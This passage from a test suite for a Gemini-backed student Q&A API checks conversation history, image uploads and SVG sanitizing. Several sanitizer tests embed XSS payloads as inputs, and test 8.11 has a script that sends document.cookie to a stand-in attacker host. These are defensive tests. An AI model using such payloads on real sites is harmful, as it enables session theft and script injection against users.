      assert.equal(res.status, 400);
      assert.match(res.body.message, /40/);
      assert.match(res.body.message, /new chat/i);
    });

    it('6.8 sends previous messages as context to Gemini (last 10 messages, cut to 1500 chars as passive data)', async () => {
      const messages = Array.from({ length: 12 }, (_, i) => ({
        role: i % 2 === 0 ? 'user' : 'assistant',
        content: i < 2 ? `OldMessage_${i}` : `RecentMessage_${i}_` + 'x'.repeat(1600),
        createdAt: new Date(),
      }));

      const historyConv = await Conversation.create({
        user: user1._id,
        title: 'Context Verification Chat',
        messages,
      });

      let capturedPrompt = '';
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async (prompt) => {
          capturedPrompt = prompt;
          return 'Contextual answer generated.';
        }
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({
            question: 'What was my previous question about?',
            mode: 'doubt',
            conversationId: historyConv._id.toString(),
          });

        assert.equal(res.status, 200);
        assert.ok(capturedPrompt.includes('=== BEGIN CONVERSATION HISTORY ==='));
        assert.ok(capturedPrompt.includes('=== END CONVERSATION HISTORY ==='));
        assert.ok(capturedPrompt.includes('CRITICAL INSTRUCTION FOR CONVERSATION HISTORY'));
        // Message 0 and 1 should not be in the prompt (only last 10 messages: index 2 to 11)
        assert.equal(capturedPrompt.includes('OldMessage_0'), false);
        assert.equal(capturedPrompt.includes('OldMessage_1'), false);
        assert.equal(capturedPrompt.includes('RecentMessage_2_'), true);
        assert.equal(capturedPrompt.includes('RecentMessage_11_'), true);
        // Verify truncation: 1600 'x's should be sliced to ensure each message is <= 1500 chars
        assert.equal(capturedPrompt.includes('x'.repeat(1501)), false);
        assert.equal(capturedPrompt.includes('x'.repeat(1400)), true);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('6.9 nothing is saved in database when Gemini fails (mock) on new conversation', async () => {
      const countBefore = await Conversation.countDocuments({ user: user1._id });

      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => {
          throw new Error('Gemini API timeout or rate limit');
        }
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({
            question: 'This question will fail during AI generation',
            mode: 'doubt',
          });

        assert.equal(res.status, 503);

        const countAfter = await Conversation.countDocuments({ user: user1._id });
        assert.equal(countAfter, countBefore, 'No new conversation document should be saved on Gemini failure');
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('6.10 nothing is saved in database when Gemini fails (mock) on existing conversation', async () => {
      const messagesBefore = convUser1.messages.length;

      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => {
          throw new Error('Gemini upstream network outage');
        }
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authUser1)
          .send({
            question: 'This follow-up question will fail',
            mode: 'doubt',
            conversationId: convUser1._id.toString(),
          });

        assert.equal(res.status, 503);

        const refreshed = await Conversation.findById(convUser1._id);
        assert.equal(refreshed.messages.length, messagesBefore, 'No messages should be appended on Gemini failure');
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('6.11 delete conversation works (returns 200, conversation removed from DB)', async () => {
      const resDelete = await request(server)
        .delete(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser1);

      assert.equal(resDelete.status, 200);
      assert.match(resDelete.body.message, /deleted/i);

      const resGet = await request(server)
        .get(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser1);

      assert.equal(resGet.status, 404);

      const dbCheck = await Conversation.findById(convUser1._id);
      assert.equal(dbCheck, null);
    });

    it('6.12 GET /api/ask/conversations returns list newest first with id, title, updatedAt', async () => {
      const convOlder = await Conversation.create({
        user: user1._id,
        title: 'Older Chat',
        updatedAt: new Date(Date.now() - 10000),
      });

      const convNewer = await Conversation.create({
        user: user1._id,
        title: 'Newer Chat',
        updatedAt: new Date(),
      });

      const res = await request(server)
        .get('/api/ask/conversations')
        .set('Authorization', authUser1);

      assert.equal(res.status, 200);
      assert.ok(Array.isArray(res.body.conversations));
      const titles = res.body.conversations.map((c) => c.title);
      assert.ok(titles.indexOf('Newer Chat') < titles.indexOf('Older Chat'), 'Must be sorted newest first');

      const first = res.body.conversations[0];
      assert.ok(first.id);
      assert.ok(first.title);
      assert.ok(first.updatedAt);
    });

    it('6.13 PATCH /api/ask/conversations/:id renames title (1..80) and rejects invalid title with 400', async () => {
      const resValid = await request(server)
        .patch(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser1)
        .send({ title: 'New Renamed Title' });

      assert.equal(resValid.status, 200);
      assert.equal(resValid.body.conversation.title, 'New Renamed Title');

      const updated = await Conversation.findById(convUser1._id);
      assert.equal(updated.title, 'New Renamed Title');

      const resEmpty = await request(server)
        .patch(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser1)
        .send({ title: '   ' });

      assert.equal(resEmpty.status, 400);

      const resTooLong = await request(server)
        .patch(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser1)
        .send({ title: 'a'.repeat(81) });

      assert.equal(resTooLong.status, 400);

      const resNonString = await request(server)
        .patch(`/api/ask/conversations/${convUser1._id}`)
        .set('Authorization', authUser1)
        .send({ title: 12345 });

      assert.equal(resNonString.status, 400);
    });

    it('6.14 POST /api/ask rejects invalid conversationId format with 400', async () => {
      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authUser1)
        .send({
          question: 'Explain deadlock handling',
          mode: 'doubt',
          conversationId: 'not-a-valid-id',
        });

      assert.equal(res.status, 400);
      assert.match(res.body.message, /invalid conversationId/i);
    });
  });

  // ==========================================
  // ITEM 7: Ask AI Image Upload
  // ==========================================
  describe('7. Ask AI Image Upload', () => {
    let imageUser;
    let authImageUser;

    const validPngBuffer = Buffer.from([
      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
      0x49, 0x48, 0x44, 0x52,
    ]);

    const validJpegBuffer = Buffer.from([
      0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
      0x01, 0x01, 0x00, 0x60,
    ]);

    const validWebpBuffer = Buffer.concat([
      Buffer.from('RIFF'),
      Buffer.alloc(4),
      Buffer.from('WEBP'),
      Buffer.from('VP8 '),
    ]);

    before(async () => {
      imageUser = await User.create({
        name: 'Image Test Student',
        email: `imagestudent_${Date.now()}@test.edu`,
        password: 'password123',
      });
      authImageUser = `Bearer ${jwt.sign({ id: imageUser._id }, getJwtSecret(), { expiresIn: '1h' })}`;
    });

    beforeEach(async () => {
      await Conversation.deleteMany({});
      const today = getKolkataDateString();
      if (imageUser) {
        await AskUsage.deleteOne({ user: imageUser._id, date: today });
      }
    });

    afterEach(async () => {
      await Conversation.deleteMany({});
      const today = getKolkataDateString();
      if (imageUser) {
        await AskUsage.deleteOne({ user: imageUser._id, date: today });
      }
    });

    it('7.1 accepts a valid PNG image upload with mock Gemini and saves hasImage: true', async () => {
      let capturedPayload = null;
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async (payload) => {
          capturedPayload = payload;
          return 'The diagram depicts a binary search tree balanced structure.';
        }
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authImageUser)
          .field('question', 'What does this diagram show?')
          .field('mode', 'doubt')
          .attach('image', validPngBuffer, 'diagram.png');

        assert.equal(res.status, 200);
        assert.ok(res.body.conversationId);
        assert.match(res.body.answer, /binary search tree/i);

        // Verify multimodal payload sent to Gemini
        assert.ok(Array.isArray(capturedPayload));
        assert.equal(capturedPayload.length, 2);
        assert.ok(capturedPayload[0].includes('=== IMAGE INSTRUCTIONS ==='));
        assert.ok(capturedPayload[0].includes('NEVER guess or assume handwriting'));
        assert.equal(capturedPayload[1].inlineData.mimeType, 'image/png');
        assert.equal(capturedPayload[1].inlineData.data, validPngBuffer.toString('base64'));

        // Verify Conversation record hasImage: true
        const savedConv = await Conversation.findById(res.body.conversationId);
        assert.ok(savedConv);
        assert.equal(savedConv.messages[0].hasImage, true);
        assert.equal(savedConv.messages[1].hasImage, false);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('7.2 accepts a valid JPEG image upload with mock Gemini', async () => {
      let capturedPayload = null;
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async (payload) => {
          capturedPayload = payload;
          return 'JPEG photo processed successfully.';
        }
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authImageUser)
          .field('question', 'Explain this formula')
          .field('mode', 'mark2')
          .attach('image', validJpegBuffer, 'formula.jpg');

        assert.equal(res.status, 200);
        assert.ok(Array.isArray(capturedPayload));
        assert.equal(capturedPayload[1].inlineData.mimeType, 'image/jpeg');

        const savedConv = await Conversation.findById(res.body.conversationId);
        assert.equal(savedConv.messages[0].hasImage, true);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('7.3 accepts a valid WebP image upload with mock Gemini', async () => {
      let capturedPayload = null;
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async (payload) => {
          capturedPayload = payload;
          return 'WebP image analyzed.';
        }
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authImageUser)
          .field('question', 'Analyze this textbook page')
          .field('mode', 'simple')
          .attach('image', validWebpBuffer, 'textbook.webp');

        assert.equal(res.status, 200);
        assert.ok(Array.isArray(capturedPayload));
        assert.equal(capturedPayload[1].inlineData.mimeType, 'image/webp');
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('7.4 uses default question when image is uploaded without a question', async () => {
      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => 'Explaining the attached image content.'
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authImageUser)
          .field('mode', 'doubt')
          .attach('image', validPngBuffer, 'photo.png');

        assert.equal(res.status, 200);

        const savedConv = await Conversation.findById(res.body.conversationId);
        assert.ok(savedConv);
        const expectedDefault = 'Explain what is shown in this image and answer anything that is asked in it.';
        assert.equal(savedConv.messages[0].content, expectedDefault);
        assert.equal(savedConv.title, expectedDefault.slice(0, 60));
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('7.5 rejects a text file renamed to .png by magic bytes check (400)', async () => {
      const textBuffer = Buffer.from('This is plain text pretending to be a png file.');

      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authImageUser)
        .field('question', 'Explain this file')
        .field('mode', 'doubt')
        .attach('image', textBuffer, 'fake.png');

      assert.equal(res.status, 400);
      assert.match(res.body.message, /invalid image format/i);
    });

    it('7.6 rejects an SVG upload with 400', async () => {
      const svgBuffer = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40"/></svg>');

      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authImageUser)
        .field('question', 'Explain this SVG')
        .field('mode', 'doubt')
        .attach('image', svgBuffer, 'vector.svg');

      assert.equal(res.status, 400);
      assert.match(res.body.message, /invalid image format/i);
    });

    it('7.7 rejects a file over 4 MB with 413 or 400', async () => {
      const oversizedBuffer = Buffer.alloc(4 * 1024 * 1024 + 1024, 0x89);

      const res = await request(server)
        .post('/api/ask')
        .set('Authorization', authImageUser)
        .field('question', 'Explain this big file')
        .field('mode', 'doubt')
        .attach('image', oversizedBuffer, 'huge.png');

      assert.ok([400, 413].includes(res.status), `Expected 413 or 400, got ${res.status}`);
      assert.match(res.body.message, /4 MB/i);
    });

    it('7.8 verifies memory storage: no uploaded file is written to disk', async () => {
      const fs = require('fs');

      const uploadsDir = path.resolve(__dirname, '../../uploads');
      const dirExistsBefore = fs.existsSync(uploadsDir);
      const filesBefore = dirExistsBefore ? fs.readdirSync(uploadsDir) : [];

      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => 'Memory-only image analyzed.'
      );

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authImageUser)
          .field('question', 'Verify no disk persistence')
          .field('mode', 'mark2')
          .attach('image', validPngBuffer, 'disk-check.png');

        assert.equal(res.status, 200);

        if (fs.existsSync(uploadsDir)) {
          const filesAfter = fs.readdirSync(uploadsDir);
          assert.equal(filesAfter.length, filesBefore.length, 'No file should be written to uploads folder');
        }
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
      }
    });

    it('7.9 image request counts toward the existing daily cap and triggers 429 when cap is hit', async () => {
      const today = getKolkataDateString();

      // Clean start for imageUser usage today
      await AskUsage.deleteOne({ user: imageUser._id, date: today });

      const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
      const mockFallback = mock.method(
        geminiConfig,
        'generateWithModelFallback',
        async () => 'Quota counting image response.'
      );

      try {
        // 1. Successful request increments count
        const res1 = await request(server)
          .post('/api/ask')
          .set('Authorization', authImageUser)
          .field('question', 'First image request')
          .field('mode', 'doubt')
          .attach('image', validPngBuffer, 'img1.png');

        assert.equal(res1.status, 200);
        const usage1 = await AskUsage.findOne({ user: imageUser._id, date: today });
        assert.equal(usage1.count, 1, 'AskUsage count must increment to 1');

        // 2. Set count to 40 (cap reached)
        await AskUsage.updateOne(
          { user: imageUser._id, date: today },
          { count: 40 }
        );

        const res2 = await request(server)
          .post('/api/ask')
          .set('Authorization', authImageUser)
          .field('question', 'Blocked image request')
          .field('mode', 'doubt')
          .attach('image', validPngBuffer, 'img2.png');

        assert.equal(res2.status, 429);
        assert.match(res2.body.message, /daily ask limit reached/i);
      } finally {
        mockGetClient.mock.restore();
        mockFallback.mock.restore();
        await AskUsage.deleteOne({ user: imageUser._id, date: today });
      }
    });
  });

  // ==========================================
  // ITEM 8: Ask AI Diagram (SVG) Mode
  // ==========================================
  describe('8. Ask AI Diagram (SVG) Mode', () => {
    let svgUser;
    let authSvgUser;

    before(async () => {
      svgUser = await User.create({
        name: 'SVG Diagram Test Student',
        email: `svgstudent_${Date.now()}@test.edu`,
        password: 'password123',
      });
      authSvgUser = `Bearer ${jwt.sign({ id: svgUser._id }, getJwtSecret(), { expiresIn: '1h' })}`;
    });

    beforeEach(async () => {
      await Conversation.deleteMany({});
      const today = getKolkataDateString();
      if (svgUser) {
        await AskUsage.deleteMany({ user: svgUser._id });
      }
    });

    // Sanitizer Unit Tests
    describe('8.A SVG Sanitizer Unit Tests', () => {
      it('8.1 strips <script> tags and inner code from SVG', () => {
        const malicious = '<svg viewBox="0 0 100 100"><script>alert("xss")</script><circle cx="50" cy="50" r="20"/></svg>';
        const result = sanitizeSvg(malicious);
        assert.ok(result.svg, 'Sanitized SVG should be returned');
        assert.equal(result.isOversized, false);
        assert.ok(!result.svg.includes('<script>'), 'Must not contain <script>');
        assert.ok(!result.svg.includes('alert'), 'Must not contain script content');
        assert.ok(result.svg.includes('<circle'), 'Must preserve valid SVG elements');
      });

      it('8.2 strips onload, onclick, and all on* event handler attributes', () => {
        const malicious = '<svg onload="alert(1)"><circle onclick="alert(2)" onmouseover="alert(3)" cx="10" cy="10" r="5"/></svg>';
        const result = sanitizeSvg(malicious);
        assert.ok(result.svg);
        assert.ok(!result.svg.includes('onload'), 'Must not contain onload');
        assert.ok(!result.svg.includes('onclick'), 'Must not contain onclick');
        assert.ok(!result.svg.includes('onmouseover'), 'Must not contain onmouseover');
        assert.ok(!result.svg.includes('alert'), 'Must not contain handler code');
        assert.ok(result.svg.includes('<circle'), 'Must preserve circle element');
      });

      it('8.3 strips <foreignObject> and <iframe> tags and inner content', () => {
        const malicious = '<svg><foreignObject><div><script>alert(1)</script><p>Dangerous</p></div></foreignObject><iframe></iframe><rect width="10" height="10"/></svg>';
        const result = sanitizeSvg(malicious);
        assert.ok(result.svg);
        assert.ok(!result.svg.includes('<foreignObject>'), 'Must not contain <foreignObject>');
        assert.ok(!result.svg.includes('Dangerous'), 'Must not contain foreignObject text');
        assert.ok(!result.svg.includes('<iframe'), 'Must not contain <iframe>');
        assert.ok(result.svg.includes('<rect'), 'Must preserve rect');
      });

      it('8.4 strips javascript: links and external hrefs while preserving local "#" references', () => {
        const input = '<svg><a href="javascript:alert(1)">bad</a><a href="https://malicious.com">external</a><use href="#icon-arrow" xlink:href="#icon-arrow"/></svg>';
        const result = sanitizeSvg(input);
        assert.ok(result.svg);
        assert.ok(!result.svg.includes('javascript:'), 'Must strip javascript:');
        assert.ok(!result.svg.includes('https://malicious.com'), 'Must strip external href');
        assert.ok(result.svg.includes('href="#icon-arrow"'), 'Must keep local # href');
        assert.ok(result.svg.includes('xlink:href="#icon-arrow"'), 'Must keep local # xlink:href');
      });

      it('8.5 strips <style> tags containing @import or external url(...) references', () => {
        const malicious = '<svg><style>@import url("https://evil.com/evil.css"); .safe { fill: red; }</style><circle class="safe" r="5"/></svg>';
        const result = sanitizeSvg(malicious);
        assert.ok(result.svg);
        assert.ok(!result.svg.includes('@import'), 'Must strip style with @import');
        assert.ok(!result.svg.includes('evil.com'), 'Must strip external style reference');
        assert.ok(result.svg.includes('<circle'), 'Must preserve circle element');
      });

      it('8.6 rejects oversized SVG output larger than 100 KB', () => {
        const oversized = '<svg viewBox="0 0 100 100">' + '<path d="M0 0 L10 10"/>'.repeat(5000) + '</svg>';
        assert.ok(Buffer.byteLength(oversized, 'utf8') > MAX_SVG_BYTES);
        const result = sanitizeSvg(oversized);
        assert.equal(result.svg, null);
        assert.equal(result.isOversized, true);
      });

      it('8.7 rejects non-SVG or malformed output without <svg> tags', () => {
        const result = sanitizeSvg('This is not an SVG diagram at all.');
        assert.equal(result.svg, null);
        assert.equal(result.isOversized, false);
      });

      it('8.7a preserves viewBox casing and allows markerWidth, markerHeight, refX, refY, gradientUnits, gradientTransform, preserveAspectRatio', () => {
        const input = `
          <svg viewBox="0 0 500 500" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <linearGradient id="grad" gradientUnits="userSpaceOnUse" gradientTransform="rotate(45)">
                <stop offset="0%" stop-color="#fff" />
              </linearGradient>
              <marker id="arrow" markerWidth="10" markerHeight="10" refX="5" refY="5">
                <path d="M 0 0 L 10 5 L 0 10 z" />
              </marker>
            </defs>
            <rect width="100" height="100" fill="url(#grad)" />
          </svg>
        `;
        const result = sanitizeSvg(input);
        assert.ok(result.svg);
        assert.ok(result.svg.includes('viewBox="0 0 500 500"'), 'viewBox casing must be preserved');
        assert.ok(result.svg.includes('preserveAspectRatio="xMidYMid meet"'), 'preserveAspectRatio must be allowed and casing preserved');
        assert.ok(result.svg.includes('gradientUnits="userSpaceOnUse"'), 'gradientUnits must be allowed and casing preserved');
        assert.ok(result.svg.includes('gradientTransform="rotate(45)"'), 'gradientTransform must be allowed and casing preserved');
        assert.ok(result.svg.includes('markerWidth="10"'), 'markerWidth must be allowed and casing preserved');
        assert.ok(result.svg.includes('markerHeight="10"'), 'markerHeight must be allowed and casing preserved');
        assert.ok(result.svg.includes('refX="5"'), 'refX must be allowed and casing preserved');
        assert.ok(result.svg.includes('refY="5"'), 'refY must be allowed and casing preserved');
      });

      it('8.7b in style attributes strips any url() that is not url(#id)', () => {
        const input = `
          <svg viewBox="0 0 100 100">
            <path style="fill: url(#validId); stroke: url('https://evil.com/leak'); background: url(http://attacker.com/bg.png); filter: url(#filterRef);" />
          </svg>
        `;
        const result = sanitizeSvg(input);
        assert.ok(result.svg);
        assert.ok(result.svg.includes('url(#validId)'), 'Must preserve url(#validId)');
        assert.ok(result.svg.includes('url(#filterRef)'), 'Must preserve url(#filterRef)');
        assert.ok(!result.svg.includes('https://evil.com/leak'), 'Must strip https url()');
        assert.ok(!result.svg.includes('http://attacker.com/bg.png'), 'Must strip http url()');
      });

      it('8.7c drops empty <use> and attribute-less <a>', () => {
        const input = `
          <svg viewBox="0 0 100 100">
            <use />
            <use></use>
            <use id="orphan" />
            <use href="#valid-icon" />
            <a>Unwrapped Text</a>
            <a href="#safe-anchor">Safe Link</a>
          </svg>
        `;
        const result = sanitizeSvg(input);
        assert.ok(result.svg);
        assert.ok(!result.svg.includes('<use />'), 'Must drop empty self-closing <use />');
        assert.ok(!result.svg.includes('<use></use>'), 'Must drop empty <use></use>');
        assert.ok(!result.svg.includes('id="orphan"'), 'Must drop <use> without href');
        assert.ok(result.svg.includes('href="#valid-icon"'), 'Must keep <use> with href');
        assert.ok(!result.svg.includes('<a>Unwrapped Text</a>'), 'Must drop attribute-less <a> tags');
        assert.ok(result.svg.includes('Unwrapped Text'), 'Must preserve content of attribute-less <a>');
        assert.ok(result.svg.includes('<a href="#safe-anchor">Safe Link</a>'), 'Must keep <a> with valid href');
      });

      it('8.7d strips <image> and <img> tags along with script, onload, foreignObject, iframe, and javascript:', () => {
        const input = `
          <svg viewBox="0 0 100 100" onload="alert('onload')">
            <script>alert('script')</script>
            <foreignObject width="10" height="10"><div>bad</div></foreignObject>
            <iframe src="https://evil.com"></iframe>
            <image href="https://evil.com/pic.png" width="50" height="50" />
            <img src="https://evil.com/pic2.png" />
            <a href="javascript:alert('xss')">bad link</a>
            <circle cx="50" cy="50" r="10" />
          </svg>
        `;
        const result = sanitizeSvg(input);
        assert.ok(result.svg);
        assert.ok(!result.svg.includes('<script'), 'Must not contain script');
        assert.ok(!result.svg.includes('onload='), 'Must not contain onload');
        assert.ok(!result.svg.includes('<foreignObject'), 'Must not contain foreignObject');
        assert.ok(!result.svg.includes('<iframe'), 'Must not contain iframe');
        assert.ok(!result.svg.includes('<image'), 'Must not contain <image>');
        assert.ok(!result.svg.includes('<img'), 'Must not contain <img>');
        assert.ok(!result.svg.includes('javascript:'), 'Must not contain javascript:');
        assert.ok(result.svg.includes('<circle'), 'Must preserve safe SVG elements');
      });
    });

    // Endpoint Integration Tests
    describe('8.B POST /api/ask Diagram (SVG) Mode Endpoint', () => {
      it('8.8 passes valid SVG through with mock Gemini, returns { svg, description }, and persists to conversation', async () => {
        const validDiagramResponse = `=== DESCRIPTION ===
Flowchart of Binary Search Algorithm
=== SVG ===
<svg viewBox="0 0 400 200" xmlns="http://www.w3.org/2000/svg">
  <rect x="20" y="20" width="100" height="40" rx="5" fill="#4f46e5" stroke="#3730a3" stroke-width="2"/>
  <text x="70" y="45" fill="#ffffff" font-size="12" text-anchor="middle">Start</text>
</svg>`;

        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
        const mockFallback = mock.method(
          geminiConfig,
          'generateWithModelFallback',
          async () => validDiagramResponse
        );

        try {
          const res = await request(server)
            .post('/api/ask')
            .set('Authorization', authSvgUser)
            .send({
              question: 'Draw a flowchart of binary search algorithm',
              mode: 'svg',
            });

          assert.equal(res.status, 200);
          assert.equal(res.body.mode, 'svg');
          assert.ok(res.body.svg, 'Should return svg field');
          assert.ok(res.body.svg.startsWith('<svg'), 'svg must be valid SVG string');
          assert.equal(res.body.description, 'Flowchart of Binary Search Algorithm');
          assert.ok(res.body.conversationId, 'Should return conversationId');

          // Verify conversation in DB
          const savedConv = await Conversation.findById(res.body.conversationId);
          assert.ok(savedConv);
          assert.equal(savedConv.messages.length, 2);
          assert.equal(savedConv.messages[1].role, 'assistant');
          assert.equal(savedConv.messages[1].mode, 'svg');
          assert.ok(savedConv.messages[1].svg.includes('<rect'), 'Saved message must contain svg');
          assert.equal(savedConv.messages[1].description, 'Flowchart of Binary Search Algorithm');
        } finally {
          mockGetClient.mock.restore();
          mockFallback.mock.restore();
        }
      });

      it('8.9 returns 502 with clear message when Gemini output is not valid SVG', async () => {
        const invalidResponse = 'I apologize, but I cannot generate a diagram for this topic.';

        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
        const mockFallback = mock.method(
          geminiConfig,
          'generateWithModelFallback',
          async () => invalidResponse
        );

        try {
          const res = await request(server)
            .post('/api/ask')
            .set('Authorization', authSvgUser)
            .send({
              question: 'Draw a diagram that fails',
              mode: 'svg',
            });

          assert.equal(res.status, 502);
          assert.equal(res.body.error, true);
          assert.match(res.body.message, /valid SVG diagram/i);

          // Verify nothing saved to conversation
          const convCount = await Conversation.countDocuments({ user: svgUser._id });
          assert.equal(convCount, 0, 'No conversation should be saved on 502 failure');
        } finally {
          mockGetClient.mock.restore();
          mockFallback.mock.restore();
        }
      });

      it('8.10 returns 502 with clear message when Gemini SVG output exceeds 100 KB', async () => {
        const oversizedOutput = `=== DESCRIPTION ===
Massive SVG
=== SVG ===
<svg viewBox="0 0 100 100">${'<path d="M0 0 L10 10"/>'.repeat(5000)}</svg>`;

        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
        const mockFallback = mock.method(
          geminiConfig,
          'generateWithModelFallback',
          async () => oversizedOutput
        );

        try {
          const res = await request(server)
            .post('/api/ask')
            .set('Authorization', authSvgUser)
            .send({
              question: 'Draw a diagram that exceeds size',
              mode: 'svg',
            });

          assert.equal(res.status, 502);
          assert.equal(res.body.error, true);
          assert.match(res.body.message, /100 KB/i);

          // Verify nothing saved to conversation
          const convCount = await Conversation.countDocuments({ user: svgUser._id });
          assert.equal(convCount, 0, 'No conversation should be saved on oversized rejection');
        } finally {
          mockGetClient.mock.restore();
          mockFallback.mock.restore();
        }
      });

      it('8.11 strips malicious tags and scripts from Gemini output before returning and saving', async () => {
        const maliciousOutput = `=== DESCRIPTION ===
Diagram with injected XSS payload
=== SVG ===
<svg viewBox="0 0 200 200" onload="alert('owned')">
  <script>fetch('https://attacker.com?steal=' + document.cookie)</script>
  <foreignObject><div><iframe src="https://evil.com"></iframe></div></foreignObject>
  <a href="javascript:alert('click')">click me</a>
  <circle cx="100" cy="100" r="50" fill="#10b981"/>
</svg>`;

        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
        const mockFallback = mock.method(
          geminiConfig,
          'generateWithModelFallback',
          async () => maliciousOutput
        );

        try {
          const res = await request(server)
            .post('/api/ask')
            .set('Authorization', authSvgUser)
            .send({
              question: 'Draw a circle diagram with scripts',
              mode: 'svg',
            });

          assert.equal(res.status, 200);
          assert.ok(res.body.svg);
          assert.ok(!res.body.svg.includes('<script>'), 'Must strip <script>');
          assert.ok(!res.body.svg.includes('onload'), 'Must strip onload');
          assert.ok(!res.body.svg.includes('attacker.com'), 'Must strip script payload');
          assert.ok(!res.body.svg.includes('<foreignObject>'), 'Must strip foreignObject');
          assert.ok(!res.body.svg.includes('<iframe'), 'Must strip iframe');
          assert.ok(!res.body.svg.includes('javascript:'), 'Must strip javascript: link');
          assert.ok(res.body.svg.includes('<circle'), 'Must retain valid circle tag');

          // Verify saved conversation is also sanitized
          const savedConv = await Conversation.findById(res.body.conversationId);
          assert.ok(!savedConv.messages[1].svg.includes('<script>'));
          assert.ok(!savedConv.messages[1].svg.includes('onload'));
        } finally {
          mockGetClient.mock.restore();
          mockFallback.mock.restore();
        }
      });

      it('8.12 can retrieve conversation containing saved SVG diagram via GET /api/ask/conversations/:id', async () => {
        const diagramOutput = `=== DESCRIPTION ===
Simple triangle diagram
=== SVG ===
<svg viewBox="0 0 100 100"><polygon points="50,15 90,85 10,85" fill="#3b82f6"/></svg>`;

        const mockGetClient = mock.method(geminiConfig, 'getGeminiClient', () => ({}));
        const mockFallback = mock.method(
          geminiConfig,
          'generateWithModelFallback',
          async () => diagramOutput
        );

        try {
          const askRes = await request(server)
            .post('/api/ask')
            .set('Authorization', authSvgUser)
            .send({
              question: 'Draw a triangle diagram',
              mode: 'svg',
            });

          assert.equal(askRes.status, 200);
          const convId = askRes.body.conversationId;

          const getRes = await request(server)
            .get(`/api/ask/conversations/${convId}`)
            .set('Authorization', authSvgUser);

          assert.equal(getRes.status, 200);
          const messages = getRes.body.messages;
          assert.equal(messages.length, 2);
          assert.equal(messages[1].mode, 'svg');
          assert.ok(messages[1].svg.includes('<polygon'));
          assert.equal(messages[1].description, 'Simple triangle diagram');
        } finally {
          mockGetClient.mock.restore();
          mockFallback.mock.restore();
        }
      });
    });
  });

  // ==========================================
  // ITEM 9: Ask AI Generate Image Mode
  // ==========================================
  describe('9. Ask AI Generate Image Mode', () => {
    let genImgUser;
    let authGenImgUser;

    before(async () => {
      genImgUser = await User.create({
        name: 'Gen Image Test Student',
        email: `genimgstudent_${Date.now()}@test.edu`,
        password: 'password123',
      });
      authGenImgUser = `Bearer ${jwt.sign({ id: genImgUser._id }, getJwtSecret(), { expiresIn: '1h' })}`;
    });

    beforeEach(async () => {
      await Conversation.deleteMany({});
      const today = getKolkataDateString();
      if (genImgUser) {
        await AskUsage.deleteMany({ user: genImgUser._id });
      }
    });

    it('9.1 returns 503 "Image generation is not configured" when GEMINI_IMAGE_MODEL is missing', async () => {
      const origModel = process.env.GEMINI_IMAGE_MODEL;
      delete process.env.GEMINI_IMAGE_MODEL;

      try {
        const res = await request(server)
          .post('/api/ask')
          .set('Authorization', authGenImgUser)
          .send({
            question: 'Illustrate the structure of an atom with electrons and nucleus',
            mode: 'image',
          });

        assert.equal(res.status, 503);
        assert.equal(res.body.error, true);
        assert.equal(res.body.message, 'Image generation is not configured');
      } finally {
        if (origModel) {
